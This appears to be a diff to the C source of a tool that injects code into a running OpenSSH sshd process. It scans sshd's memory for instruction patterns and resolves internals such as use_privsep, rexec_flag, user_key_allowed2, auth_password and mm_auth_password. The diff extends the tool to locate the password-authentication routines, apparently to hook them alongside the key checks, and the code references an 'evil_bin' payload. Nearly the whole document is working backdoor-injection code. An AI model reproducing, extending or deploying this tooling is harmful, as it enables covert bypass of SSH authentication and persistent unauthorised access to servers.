@@ -30,21 +30,20 @@ signature signatures[]={
 	{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
 	{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
 	{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
-	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 }
-//	{ 0x3333333344444444, "uauth_passwd", "password change not supported", 0 }
+	{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
 };
 
-u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
-	char rdibuf[]="\x48\x8d\x3d\x00\x00\x00\x00";
-	int *rptr= (int*)&rdibuf[3];
-	u64 str_addr, lea_addr = 0, rdiff=0, rtop=0;
-	callcache_entry *callcache, *entry;
-	u32 callcache_total;
+#define LEA_RDI 0x3d
+#define LEA_RAX 0x05
+
+u64 lea_by_debugstr(inject_ctx *ctx, u8 lea_reg, char *str) {
+	u64 lea_addr, str_addr;
+	char leabuf[]="\x48\x8d\x00\x00\x00\x00\x00";
+	int *rptr = (int*)&leabuf[3];
 	int i, j;
 	mem_mapping *mapping;
 
-	callcache = get_callcache();
-	callcache_total = get_callcachetotal();
+	leabuf[2] = lea_reg;
 
 	str_addr = find_sig_mem(ctx, (u8*)str, strlen(str), MEM_R);
 
@@ -59,11 +58,71 @@ u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
 
 		for(j = 0; j < mapping->size-7; j++) {
 			*rptr = str_addr - (mapping->start+j+7);
-			if (memcmp(mapping->data+j, rdibuf, 7) == 0) {
+			if (memcmp(mapping->data+j, leabuf, 7) == 0) {
 				lea_addr = mapping->start+j;
 			}
 		}
 	}
+
+	return lea_addr;
+}
+
+u64 find_prev_lea(inject_ctx *ctx, u8 lea_reg, u64 start_addr, u64 lea_addr) {
+	int i, j;
+	mem_mapping *mapping;
+	char leabuf[]="\x48\x8d\x00\x00\x00\x00\x00";
+	int *rptr = (int*)&leabuf[3];
+
+	leabuf[2] = lea_reg;
+
+	for(i = 0; i < ctx->num_maps; i++) {
+		mapping = ctx->mappings[i];
+
+		if (!(start_addr >= mapping->start && start_addr <= mapping->end))
+			continue;
+
+		for(j = (start_addr - 7 - mapping->start); j > 0; j--) {
+			*rptr = lea_addr - (mapping->start+j+7);
+
+			if (memcmp(mapping->data+j, leabuf, 7) == 0) {
+				return mapping->start+j;
+			}
+		}
+	}
+
+	return 0;
+}
+
+u64 find_next_opcode(inject_ctx *ctx, u64 start_addr, u8 *sig, u8 siglen) {
+	int i, j;
+	mem_mapping *mapping;
+
+	for(i = 0; i < ctx->num_maps; i++) {
+		mapping = ctx->mappings[i];
+
+		if (!(start_addr >= mapping->start && start_addr <= mapping->end))
+			continue;
+
+		for(j = start_addr - mapping->start; j < mapping->size - siglen; j++) {
+			if (memcmp(mapping->data+j, sig, siglen) == 0) {
+				return mapping->start+j;
+			}
+		}
+	}
+
+	return 0;
+}
+
+u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
+	u64 lea_addr = 0, rdiff=0, rtop=0;
+	callcache_entry *callcache, *entry;
+	u32 callcache_total;
+	int i;
+
+	callcache = get_callcache();
+	callcache_total = get_callcachetotal();
+
+	lea_addr = lea_by_debugstr(ctx, LEA_RDI, str);
 
 	if (lea_addr == 0) 
 		error("could not find 'lea' insn for str '%s'", str);
@@ -84,16 +143,36 @@ u64 sub_by_debugstr(inject_ctx *ctx, char *str) {
 	return rtop;
 }
 
+u64 resolve_call_insn(inject_ctx *ctx, u64 call_insn_addr) {
+	u8 opcode;
+	u32 call;
+
+	_peek(ctx->pid, call_insn_addr, &opcode, 1);
+
+	if (opcode != 0xe8)
+		return 0;
+
+	_peek(ctx->pid, call_insn_addr+1, &call, 4);
+
+	return call_insn_addr + 5 + call;
+}
+
 int main(int argc, char *argv[]) {
 	char line[255], sshd_path[255], proc_exe[64];
 	int i, j;
+
+	char rdibuf[]="\x48\x8d\x3d\x00\x00\x00\x00";
+	int *rptr = (int*)&rdibuf[3];
 
 	u32 nullw=0, callcache_total;
 	callcache_entry *callcache, *entry;
 	u64 diff=0, hole_addr=0, rexec_flag;
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
+	u64 use_privsep=0, logit_passchange=0, privsep_lea=0, privsep_test=0;
+	u64 auth_password=0, mm_auth_password=0;
 	u32 num_key_allowed2_calls=0;
 	u8 *evil_bin;
+	u8 privsep_jnz[2]={0,0};
 
 	mem_mapping *m1, *m2;
 
@@ -136,6 +215,34 @@ int main(int argc, char *argv[]) {
 	if (dynsym == 0 || dynstr == 0)
 		error("could not find dynsym.\n");
 
+	// oboi, what a mess
+	use_privsep = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "use_privsep");
+	info("found use_privsep\t\t= 0x%llx", use_privsep);
+
+	logit_passchange = lea_by_debugstr(ctx, LEA_RDI, "password change not supported");
+	info("logit(\"password change..\") = 0x%llx", logit_passchange);
+
+	privsep_lea = find_prev_lea(ctx, LEA_RAX, logit_passchange, use_privsep);
+	info("lea rax, privsep\t\t= 0x%llx", privsep_lea);
+
+	privsep_test = find_next_opcode(ctx, privsep_lea, "\x85\xc0", 2);
+	info("privsep test\t\t= 0x%llx", privsep_test);
+
+	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);
+
+	if (privsep_jnz[0] != 0x75) {
+		error("wtf du0d.. the next insn is not a jnz.. wtf..");
+		return -1;
+	}
+
+	auth_password = resolve_call_insn(ctx, privsep_test+4);
+	info("auth_password\t\t= 0x%llx", auth_password);
+
+	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
+	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
+	
+
+	// deal with rexec
 	rexec_flag = ctx->elf_base + resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, "rexec_flag");
 
 	if (rexec_flag == ctx->elf_base) {
